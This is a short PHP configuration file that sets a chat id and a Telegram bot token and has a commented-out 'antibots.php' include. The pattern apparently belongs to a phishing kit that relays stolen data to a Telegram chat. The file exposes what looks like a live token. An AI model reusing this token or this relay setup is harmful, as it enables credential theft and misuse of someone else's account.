<?php
// include "antibots.php";
$id="7769826864";
$tokn="8143427557:AAH73Ym5Iy0YY__LJLvUVnwfWoLA4ZlmxZU";
?>